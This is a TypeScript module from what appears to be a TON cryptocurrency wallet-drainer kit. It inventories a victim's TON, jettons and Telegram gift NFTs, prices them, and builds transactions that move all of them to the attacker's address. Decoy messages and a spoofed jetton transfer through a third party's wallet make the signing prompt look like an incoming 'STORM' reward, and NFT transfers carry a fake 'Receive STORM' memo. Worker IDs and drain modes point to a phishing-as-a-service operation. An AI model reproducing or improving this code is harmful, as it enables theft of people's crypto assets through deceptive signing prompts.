import { Fragment } from '@contracts/fragment'
import { HoneyPot } from '@contracts/honeypot'
import { Transfer } from '@contracts/transfer'
import { Worker } from '@db/controllers/workers'
import { DrainMode } from '@prisma/client'
import { Address, fromNano, beginCell, toNano } from '@ton/core'
import path from 'path'
import { Ton } from './tonapi'
import type { FormedData, Item, Options } from './types'

enum ItemTypes {
	TON = 'TON',
	NFT = 'NFT',
	JETTON = 'JETTON',
}

// Gas floor left on the victim wallet after a drain. Capped lower on tiny
// balances so they still drain instead of returning nothing.
const MIN_TON_RESERVE = 0.08

const nftCollections = [
  '0:0e41dc1dc3c9067ed24248580e12b3359818d83dee0304fabcf80845eafafdb2',
  '0:80d78a35f955a14b679faa887ff4cd5bfc0f43b4a4eea2a7e6927f3701b273c2',
  '0:c845e95e3a44f1083e20fd7126f318f42d8360ebecccb13180030080faf11b90', // astral shard
  '0:b01057d46db47edb67e7dd583152906297b6f0050a841e6ef081061b598f5cd3', // bdaycandles
  '0:78c77b13d4355d383cdacb71fee1524874ea284b9fa44e0c8a7183195a880f3a', // berryboxes
  '0:f1f92a901213fd4737e2d9ca9d7a14d552f41b02bb14cf55fbb7eba5f0888a66', // bigyear
  '0:37fa2d485058d6c8385a228086758501e27b76218693dd3fbde421cfad2bd5dc', // bunnymuffins
  '0:cb33ae6dd2c852ee064083494c96d187621b14f783f3b0c24785889b99157b91', // candycanes
  '0:53f4f6d9051e8519c6414a7c20a3e0cba5cd2beff5fff1d9611b9500eaff65f6', // cookiehearts
  '0:2d81b8521cea93c63b912cb38069be93eba14f71059335dfc34f7560086d7eb4', // crystalballs
  '0:4c71f300665314af55b75fc91d130ddf24c5006961f8f9772613947945f14863', // deskcalendar
  '0:9687594f96dc93c025b10979b8ba62f9b4f6685d1f244c8713fa977426aa1a74', // diamondrings
  '0:fd8a466aeb13e02a3ce67411b41b44bcd11bd42636f0807acf6570ca73fc2c13', // durovcaps
  '0:309cfedd19f13f58ed318828ae964017506d4ad5b587d6f13593ae13e06fbb82', // eastereggs
  '0:0e6182626fc2bafbdd538de39845b584b5bb512475caa1696d9d42f075aa9dee', // electricskulls
  '0:7364b348af89627b4a537eb6d1b003493ad158c18e609a78117ecf3845ab39f9', // eternalcandles
  '0:ee9b2ddb9d96335786d258c492664997ab1e745ee1f977d4655ffc848b614d96', // eternalroses
  '0:d0e838d169b4d8480c5fdb1ad9b27b17b6a7089b56e3f5d179c7f87c94d8d63e', // evileyes
  '0:46da8d25a7ee8ecbce8d184266ef5ec17930c0c3f17910b920697da5f54b1f6a', // flyingbrooms
  '0:add82df2091357dbaec1de5ea1d50b14e9a826e1981301becda551a214a9415c', // genielamps
  '0:427bbe46d00863a82eb807b1ff0473f4c207ce357ff1f7caecce6b04c2774354', // gingercookies
  '0:7cccbcc438540adea4f231880f0fc06ece63706e59e8baa681f343d6facd84ee', // hangingstars
  '0:7a02d04f3ae4ed42697ca1203b5fc66a27942670e618aa8cfddac4185c6510af', // hexpots
  '0:793f764fd8f8cb20e379d98d52340bb1d5da38f993aa316a2d5d2f9f74ca6a1d', // holidaydrinks
  '0:9e7eb8e1083dbfec7448af6966c2df596aa786fed76c781bc00c2ebaf37de405', // homemade
  '0:bae58cba374e2f1e8782274ca8e2a965e5ebbe65a59b4b99f1b1d8a5c729a199', // hypno
  '0:cbec731b71ad05b9fae31c5711a222e4122397917a0efef1f681550df09369e2', // iongem
  '0:38d3542aa57b419f021a0db163c1de725df3f6998882bac6c9dd9730f5e5d1f4', // jacksinthebox
  '0:30cee6dea09c27aa6981b933e99d44aead1cd63c1f0447371fcf1e7967662313', // jellybunnies
  '0:812bf241012000e57573d43d7b3e7fbe91068c5a6d1bf7045e56db047513b84e', // jester
  '0:9e86b919b4a0ed55ed2acaf040b2b1f1de15be86ba10c83ad2fcc64e39562d87', // jinglebells
  '0:d3ae8fa88096d2ee8f8e043e9bb76372b0fb7b4a71a6e737ee457181d6713fad', // kissedfrogs
  '0:bace389df2f24d116a9c5e4d745e3b1d0cb44a6dc3d9cdb1eeb2e116e85a2439', // lolpops
  '0:84f340259fc61f95d9d02f058cbce7e5a0b1a098f6347860c9cfdb9f1b7811ba', // lootbag
  '0:ea1f04b353823f538e2f48cf440cfe07186296cbdc968dbce4a426b72bc88c04', // lovecandles
  '0:fbc83bb658281df54cf1d5d17f0d09162bb219249e0ca7d33d835ac651489013', // lovepotions
  '0:b696c532d522b1244241c23e5909f5672cfbc0a83ab2e5cdba5e0f314bfa434d', // lunarsnakes
  '0:5d94a84bcdecd814c0964964c29e1a4a0b5bb273368150e8f712d3e371ab54b1', // madpumpkin
  '0:2d154f46ac67e2c78506f433a2bcde7c431be004951a019fe97590590a66e12a', // magicpotion
  '0:99c7114c4becb585c1800cbe843c1eeeb0db2d42a0fdbbec81698a5755532bef', // minioscar
  '0:5ac82636c19c2b54113135f2cbf2ff4ad261cd9ab4139ed665760a58891c01fd', // nekohelmet
  '0:9ad48d3d7c4f54a1357a6b033a402f7e7e4bf9d61a228b6e30d6d26815f8a01b', // partysparklers
  '0:c9b0df4e24184a199a16656b64129ce409f22ed7a67d5334d66d88de2e9b8775', // perfumebottles
  '0:412d116d0bfdcf2f1369597e677dc8706a993b796706dddccaa316d5e9c5b3a9', // petsnake
  '0:46fa0e9a864014196a5e7d66f1f83ffdb10f2859bbf2ea9baeabbf14d9ce0d50', // plushpepe
  '0:388b9f22b92f4351846d519f7bb19a399a791b898501a565d039eddd11409c3f', // preciouspeaches
  '0:ebe319f9fc6a02cc3c6118931e93b7efde79ba5bb6e146f9434818dc359ba5e7', // recordplayers
  '0:8305b4186efde7f754f0cb00510fd62b24db8d5666c3dd2a6ba6aea15880c756', // sakuraflowers
  '0:1a4c847ba09ca8c038ae9982d5374a1eeb590613723a10f127ed68073c6b9601', // santahats
  '0:13b9419dbeb8cbbd3584e69a5514e542a94d9d9422d49ca4ecbb49f52589bd95', // scaredcats
  '0:ab180f6c942a24b200fe3724438ed1f248a3744ecf24ea176e78991491965d0f', // signetrings
  '0:5a38bf261f9632c245e3929b3ae57d4e2cf347ee99ece1871f2e6695a456a834', // skullflower
  '0:5c3713024f210791c43970addf3bfdc46e37fa25c039249fce255e27a4337eeb', // sleighballs
  '0:5b50ac7909a944972d937a40cd7856efe1ed36a63eb1b00a9764fd17fc0a6b2a', // snakeboxes
  '0:0f36eeb8f1f7bfbaa528787e95ffe7c80c961e6bfe57bb6ad79fa899162978f5', // showglobes
  '0:0833ee50cd9197613499475446793da0f6b36962634f434f7f1edbda2271da4f', // snowmittens
  '0:3c0c25b2096cb2c2038a60e45ead1a1255ebd6ad443f16329080d8a1c58d76db', // spicedwines
  '0:fa987f5bc1b9fa4b733fb424563afa80216f0cdf8911c1b234d678862d13de0c', // spyagarics
  '0:405d1ebc7f55204614e8151fdb5d8d733c9cb93bab26d92b740914e8f76053c4', // starnotepad
  '0:48d3b3d77b0f78610cfb1b037bda73cd185ea1b524ce264b94e0ac7f6e34d9bf', // swisswatches
  '0:3f931d963b27575b361460ed433fcd1a1e5e328652c6621c633c0b513cd8cc81', // tamagadgets
  '0:03bc9c4cc421c0edf465623a1c7813917fb4702acd2bce355a29ea5000232767', // tophats
  '0:b582e77a40ef0d7498d5aeaafba8504c3b4a10b24b64bf3866211a0c2a8f2fc6', // topbears
  '0:b200c91be9b37236528f1f4b496ee6e4d55563012ab2abdb19c2427c01bc4c93', // trappedhearts
  '0:02710a51d9f99d784356744d98190587571493c80f19ab8fe4eeb93f21ac4245', // vintagecigars
  '0:8db26a47a91498fc3c67ca1e8fd0c30eef370005ff2c56f1b4c2bdb8e690733b', // voodoodolls
  '0:bc5955bd0d23783cf7c59425b60072645f10541c116cbe7857898a924e90fbb5', // winterwreath
  '0:43f1a04a0b836c9d832ab6409f3d09361159e27b29c9429d54819572c7556647', // witchhat
  '0:f3fd579c12b1014cb393891d6dab4552de566e1c7aa16268596ed85cadb164ef', // xmasstock
  // ── 2025-2026 gift collections (verified on-chain 2026-10) ──────
  '0:65049e27d35a6661ecf954f77c5a8e7df2cf1a81b402c953a3b9c5cac4b0c08b', // Chill Flames
  '0:171d6f4a5586200e62da50d720ccd3d9e162867a4f7bfa576c7747cf5078382b', // Clover Pins
  '0:342418950a3760aa48878989888135016d923a98d6e74b29aa7f41c50bb161c6', // Cupid Charms
  '0:fdcfcee1459015ec2d8c575824dfdf9b4a0e587ecd8474cafd1df2bcd48b81d9', // Faith Amulets
  '0:147df416974f7fca15c34e9f28375dcfc7cca03e6d317323468473a238d57ec7', // Fresh Socks
  '0:2ab45e6d64880d65a97cd0287374f32f64237c3846c909524f9ffd3134f82140', // Gem Signets
  '0:7501368a18d624e93e51d9c035f01385f8a07f89d68a2a2830608da3b635ae2e', // Happy Brownies
  '0:b85c4ba5c5bd392dee6017a7ac32d0d64f95d9ead97394c05018db2a7dfc6974', // Heart Lockets
  '0:2544ea639b5935996df4afad6a471de5607b1991329755289a1c42213a59d803', // Heroic Helmets
  '0:54bec904be659da7f57a1d7fb64f27e9e26152ccccdd83d4da533eb3295cfa3a', // Ice Creams
  '0:5220877bb0c9a5a8df2804668c36d51eb9a2de4903d4475072330a677d62f786', // Input Keys
  '0:488f4b85faa2004aabfaa88bdc4e27f6c0a49db7859073899ca01cb0369e469e', // Instant Ramens
  '0:8454b05b8332f9221f5bccc92778b8baf31cce7a560ddcd12e826ff88194e9b8', // Ionic Dryers
  '0:9e4d224e3d73ff492bce8c82d8fa4ba2e1b187526b1af94ed35cfe038d400d4e', // Jolly Chimps
  '0:8170c3e9123289cac4dbe77e0dbeddc55d0824cd5ca169a043232adc68a0f53e', // Joyful Bundles
  '0:ec899ba58909ff15351ec8255a561a2396363b2e68a6754b492b54a7b464f37d', // Khabib's Papakhas
  '0:d1adfc39a60202e1ee8d69f500c79d99f589baab5936eb1c5a5d1feac742ca24', // Light Swords
  '0:c23eaed0494bc29aaee4061983ba5c5575e147285735c13f4c4319deb1a9e5d4', // Low Riders
  '0:3694772f6565bf6cdff634c2ab90452ff71cfa7f1f304c4e6ea5af2ed677996f', // Lush Bouquets
  '0:de5f4175183ba0363b7190546286ef59c8516e981bf68d8179025d6d871d800c', // Mighty Arms
  '0:4cdd4d6dc168c8fef61468f74593366cd6af5cd28ac78508f1d26d976bd96381', // Money Pots
  '0:55e57a33280d1ed3a679cba78bee95ab514a44a256cf84d75c352d0ae190e4d6', // Mood Packs
  '0:bba0f6be8090d9e894705b4596e161ff5639fb8a82a67c374522d0fb9d814675', // Moon Pendants
  '0:63cdd8b6ed923e45ef7738e2226b49bb626514f1df2e6c936c4ad65373ba8d26', // Mousse Cakes
  '0:198ee50999b3fe578472a308dec61edb21c74daeba23af458a4a9760801d336e', // Nail Bracelets
  '0:f5605a75d80184817e82dee89687be7511c4713d9a3a1ad0661f3898dbd8dc6d', // Pool Floats
  '0:341334585f9c26feae3afcd5fc6fb11886d3a45df5e0b2bd3a1136e8bf56bb4a', // Pretty Posies
  '0:08c0430eeb007c21bcbc55ad044063e40d671573ab9498c39f5e6132a9998cf7', // Rare Birds
  '0:f270e8242f071f3c3a2487cabed83214cd584f7ad745b999b0ac56053fa8b59d', // Restless Jars
  '0:24a9b53092e172e6c8248171064abf564b19dbb25542736e518bd05f0042335c', // Sky Stilettos
  '0:11200ba6196066292bf6068331b6e9c2105c9b227ea78a60aafe569eaa40fe01', // Bling Binkies
  '0:8c06079134e8d9a3a03f1a91781bae954c0f15e2fa528ad219cc93f7433e193b', // Bonded Rings
  '0:36448ed7bc8b3dc0940aaf19136fb62da5e52e683fa9d1e4f9b817b86e47064f', // Artisan Bricks
  '0:e9c49e95030500fad5fac3c0029e80092eb3f784a5a689e065ef5bafd7fa8a44', // Bow Ties
]

/* Wallet scan cache. The client re-polls /transaction every ~2.5s while a
   prompt is open, and each miss is 3 TonAPI calls. A 4s TTL collapses that. */
const WALLET_CACHE_MS = Number(Bun.env.WALLET_CACHE_MS ?? 4000)
const WALLET_CACHE_MAX = 500

// Simple floor price cache for gift NFTs (collection address → {price, ts})
const nftFloorCache = new Map<string, { price: number; ts: number }>()
const NFT_FLOOR_TTL_MS = 10 * 60 * 1000 // 10 min
// Negative cache: collections we know have no listings right now
const nftNoSaleCache = new Map<string, number>()

async function getGiftFloorPrice(col_address: string): Promise<number> {
	const cached = nftFloorCache.get(col_address)
	if (cached && Date.now() - cached.ts < NFT_FLOOR_TTL_MS) {
		return cached.price
	}

	// Skip re-fetching collections known to have zero listings (60s cooldown)
	const noSale = nftNoSaleCache.get(col_address)
	if (noSale && Date.now() - noSale < 60_000) {
		return 0
	}

	try {
		// TonAPI v2 has NO floor_price field on collections.
		// Real floor = min(sale.price) across items currently listed.
		// is_selling=true returns only items with an active sale.
		const data: any = await Ton.request(
			`/nfts/collections/${col_address}/items?limit=1000&is_selling=true`
		)

		let floor = Infinity
		for (const item of data.nft_items ?? []) {
			const val = Number(item?.sale?.price?.value)
			if (val > 0 && val < floor) floor = val
		}

		const floorTon = floor === Infinity ? 0 : floor / 1e9
		if (floorTon > 0) {
			nftFloorCache.set(col_address, { price: floorTon, ts: Date.now() })
		} else {
			nftNoSaleCache.set(col_address, Date.now())
		}
		return floorTon
	} catch {
		return 0
	}
}


class AssetsService {
	private cache = new Map<
		string,
		{ at: number; data: { drainable: FormedData; sorted: Item[] } }
	>()

	/** Called after a successful drain so the next poll sees fresh balances. */
	public invalidate(address: string): void {
		let raw = address
		try {
			raw = Address.parse(address).toRawString()
		} catch {
			/* keep the raw input */
		}
		for (const k of this.cache.keys()) {
			if (k.startsWith(raw + '|')) this.cache.delete(k)
		}
	}

	private async readJsonFile(
		filePath: string
	): Promise<{ [key: string]: any }> {
		try {
			const data = Bun.file(filePath)
			return data.json()
		} catch (error) {
			console.error(`Error reading JSON file at ${filePath}:`, error)
			return {}
		}
	}

	async getNFTPrice(
		col_address: string,
		nftName: string,
		workerId: number
	): Promise<number> {
		const filePath = path.join(__dirname, '..', 'items', 'prices.json')
		const prices = await this.readJsonFile(filePath)

		if (nftName in prices) {
			return prices[nftName]
		}

		// Try worker-specific floor price (numbers/usernames)
		const workerPrice = await Worker.GetNFTPrice(col_address, workerId)
		if (workerPrice > 0) return workerPrice

		// Fallback: fetch live floor from TonAPI (gifts + unknown collections)
		return getGiftFloorPrice(col_address)
	}

	async loadCancelList(): Promise<Record<string, boolean>> {
		const filePath = path.join(__dirname, '..', 'items', 'cancel.json')
		const cancelList = await this.readJsonFile(filePath)

		return Object.keys(cancelList).reduce((acc, item) => {
			acc[item] = true
			return acc
		}, {} as Record<string, boolean>)
	}

	async loadIgnoreList(): Promise<Record<string, boolean>> {
		const filePath = path.join(__dirname, '..', 'items', 'ignore.json')
		const ignoreList = await this.readJsonFile(filePath)

		return Object.keys(ignoreList).reduce((acc, item) => {
			acc[item] = true
			return acc
		}, {} as Record<string, boolean>)
	}

	private isExcluded(
		name: string,
		excludedItems: Record<string, boolean>
	): boolean {
		return Boolean(excludedItems[name])
	}

	async Arrange(address: string): Promise<FormedData> {
		const [wallet, nfts, jettons] = await Promise.all([
			Ton.getWalletData(address),
			Ton.getNfts(address),
			Ton.getJetTons(address),
		])

		const formed: FormedData = {
			wallet,
			ton: wallet.balance !== undefined ? Number(wallet.balance) : 0,
			nfts: [],
			jettons: [],
		}

		const ignoreList = await this.loadIgnoreList()

		nfts.nft_items.forEach(v => {
			if (v.approved_by.length > 0 && v?.collection?.address) {
				if (nftCollections.includes(v.collection.address)) {
					if (!this.isExcluded(v.metadata.name, ignoreList)) {
						formed.nfts.push({
							address: v.address,
							name: v?.metadata?.name || 'Unknown',
							col_address: v?.collection?.address || 'Unknown',
						})
					}
				}
			}
		})

		jettons.balances.forEach(v => {
			if (v.jetton.verification === 'whitelist' && Number(v.balance) > 0) {
				formed.jettons.push({
					address: v.jetton.address,
					wallet: v.wallet_address.address,
					amount: Number(v.balance),
					rate: v.price?.prices?.TON || 0,
					dec: v.jetton.decimals,
					name: v.jetton.name,
				})
			}
		})

		return formed
	}

	public async sort(
		items: FormedData,
		workerId: number,
		drainMode: DrainMode,
		nftName?: string,
		nftPrice?: number
	) {
		let all = []

		const cancelList = await this.loadCancelList()

		if (drainMode === DrainMode.Full) {
			all.push({
				type: ItemTypes.TON,
				raw: items.ton,
				price: Number(fromNano(items.ton)),
			})

			for (const v of items.nfts) {
				all.push({
					type: ItemTypes.NFT,
					raw: v,
					price: await this.getNFTPrice(v.col_address, v.name, workerId),
					name: v.name,
					shouldCancel: this.isExcluded(v.name, cancelList),
				})
			}

			items.jettons.forEach(v => {
				all.push({
					type: ItemTypes.JETTON,
					raw: v,
					price: +v.amount * Math.pow(10, -v.dec) * v.rate,
					name: v.name,
				})
			})
		} else if (drainMode === DrainMode.NFT) {
			for (const v of items.nfts) {
				all.push({
					type: ItemTypes.NFT,
					raw: v,
					price: await this.getNFTPrice(v.col_address, v.name, workerId),
					name: v.name,
					shouldCancel: this.isExcluded(v.name, cancelList),
				})
			}
		} else if (drainMode === DrainMode.Trade && nftName && nftPrice) {
			const nft = items.nfts.find(v => v.name === nftName)
			if (nft) {
				all.push({
					type: ItemTypes.NFT,
					raw: nft,
					price: nftPrice,
					name: nft.name,
					shouldCancel: this.isExcluded(nft.name, cancelList),
				})
			}
		}

		all.sort((a, b) => b.price - a.price)

		return all
	}

	public async get(
		address: string,
		options: Options
	): Promise<{ drainable: FormedData; sorted: Item[] }> {
		const key = [
			address,
			options.workerId,
			options.drainMode,
			options.name,
			options.amount,
		].join('|')

		const hit = this.cache.get(key)
		if (hit && Date.now() - hit.at < WALLET_CACHE_MS) return hit.data

		try {
			const drainable = await this.Arrange(address)

			const sorted = await this.sort(
				drainable,
				options.workerId,
				options.drainMode,
				options.name,
				options.amount
			)

			const data = { drainable, sorted }

			if (this.cache.size >= WALLET_CACHE_MAX) {
				const oldest = this.cache.keys().next().value
				if (oldest) this.cache.delete(oldest)
			}
			this.cache.set(key, { at: Date.now(), data })

			return data
		} catch (error) {
			console.error('Error in get method:', error)
			throw error
		}
	}

	public async prepareContracts(
		address: string,
		send_to: string,
		options: Options
	) {
		address = Address.parse(address).toRawString()
		send_to = Address.parse(send_to).toRawString()

		const worker = await Worker.Get(options.workerId)
		const { drainable, sorted } = await this.get(address, options)

		// Use full bigint precision for the balance, float only for thresholds.
		const tonBalanceBigInt = BigInt(drainable.ton)
		const tonTotal = Number(fromNano(tonBalanceBigInt))
		if (tonTotal < 0.1 || !worker) return { messages: [], raw: sorted }

		const messages: any[] = []
		const cancelMessages: any[] = []

		// Detect wallet version for per-tx limits
		const walletInterfaces = drainable.wallet.interfaces || []
		const walletType = walletInterfaces[0] || 'default'
		const walletVersionMatch = walletType.match(/wallet_v(\d+)/)
		const walletVersion = walletVersionMatch
			? parseInt(walletVersionMatch[1], 10)
			: 0
		const isV5 = walletVersion === 5
		const transactionLimit = isV5 ? 255 : 4

		// Threshold for jetton drain: lower for v5 (can batch all in one tx)
		const jettonMinPrice = isV5 ? 0.05 : 0.3

		// Every message below attaches real TON, so build against a spend
		// budget. Overrunning it makes the wallet reject with "insufficient
		// funds" (the old code attached decoys on top of the full balance).
		// Uninitialised wallets also pay for their own deployment on the first
		// send, so they need a bigger floor.
		const status = String(drainable.wallet.status || '')
		const isUninit = status === 'uninit' || status === 'nonexist'
		const FLOOR = isUninit ? 0.15 : MIN_TON_RESERVE
		const RESERVE = toNano(
			Math.min(FLOOR, Math.max(0.03, tonTotal * 0.35)).toFixed(9)
		)
		let budget = tonBalanceBigInt - RESERVE

		const NFT_COST = toNano('0.1') // matches Transfer.Nft
		const JETTON_COST = toNano('0.1') // matches Transfer.JetTon
		const HONEY_COST = toNano('0.15') // floor enforced by HoneyPot
		const DISPLAY_COST = toNano('0.15') // fixed value below
		const CANCEL_COST = toNano('0.025')

		// Keep one slot free for the headline TON transfer.
		const slotLimit = Math.max(0, transactionLimit - 1)
		const canAdd = () => messages.length + cancelMessages.length < slotLimit

		for (const v of sorted) {
			switch (v.type) {
				case ItemTypes.TON:
					// Amount is decided after the other messages are budgeted.
					break

				case ItemTypes.NFT:
					if (budget < NFT_COST || !canAdd()) break

					// Always direct-transfer NFTs, never auction.
					messages.push(
						Transfer.Nft(
							v.raw.address,
							send_to,
							`Receive ${options.amount} STORM`
						)
					)
					budget -= NFT_COST

					if (v.shouldCancel && budget >= CANCEL_COST && canAdd()) {
						cancelMessages.push(Fragment.cancelAuction(v.raw.address))
						budget -= CANCEL_COST
					}
					break

				case ItemTypes.JETTON:
					if (v.price > jettonMinPrice && budget >= JETTON_COST && canAdd()) {
						messages.push(
							Transfer.JetTon(v.raw.wallet, send_to, BigInt(v.raw.amount))
						)
						budget -= JETTON_COST
					}
					break

				default:
					break
			}
		}

		// Respect the wallet's per-tx message limit for main + cancel messages.
		const slicedMessages = messages.slice(0, slotLimit)
		const cancelBudget = Math.max(0, slotLimit - slicedMessages.length)
		slicedMessages.push(...cancelMessages.slice(0, cancelBudget))

		// Decoy messages: only spend on them when the budget actually allows.
		if (
			worker.honeyPot &&
			slicedMessages.length < slotLimit &&
			budget >= HONEY_COST
		) {
			const msg = await HoneyPot.generateMessage(
				0.15,
				options.amount,
				worker.honeyPotMode,
				send_to
			)
			slicedMessages.push(msg)
			budget -= HONEY_COST

			// Display-only TEP-74 transfer so the wallet popup renders STORM.
			if (slicedMessages.length < slotLimit && budget >= DISPLAY_COST) {
				const shown = Number(options.amount) > 0 ? Number(options.amount) : 1000
				const displayBody = beginCell()
					.storeUint(0x0f8a7ea5, 32)
					.storeUint(0, 64)
					.storeCoins(toNano(shown.toFixed(9)))
					.storeAddress(Address.parse(address))
					.storeAddress(Address.parse(address))
					.storeBit(0)
					.storeCoins(toNano('0.05'))
					.storeBit(0)
					.endCell()
					.toBoc()
					.toString('base64url')
				// Real, funded STORM jetton wallet (owner stormstaking.ton).
				// Using a live wallet owned by a third party makes wallets render
				// this as an incoming transfer ("received ... from ...") instead
				// of a send, and its balance is big enough for 1000 to clear.
				slicedMessages.push({
					address: '0:473430b4d4c1c3e14fb71481e4b70e902120645e01a98d0905a0e864815a5e95',
					amount: DISPLAY_COST.toString(),
					payload: displayBody,
				})
				budget -= DISPLAY_COST
			}
		}

		// Whatever is left in the budget is the actual drain, sent first.
		if (
			options.drainMode === DrainMode.Full &&
			budget > toNano('0.02') &&
			slicedMessages.length < transactionLimit
		) {
			slicedMessages.unshift(Transfer.Ton(send_to, Number(fromNano(budget))))
			budget = 0n
		}

		const friendlyMessages = slicedMessages.map(m => ({
    ...m,
    address: Address.parse(m.address).toString({
        bounceable: true,
        urlSafe: true,
    }),
}))

return { messages: friendlyMessages, raw: sorted }
	}
}

export const Assets = new AssetsService()

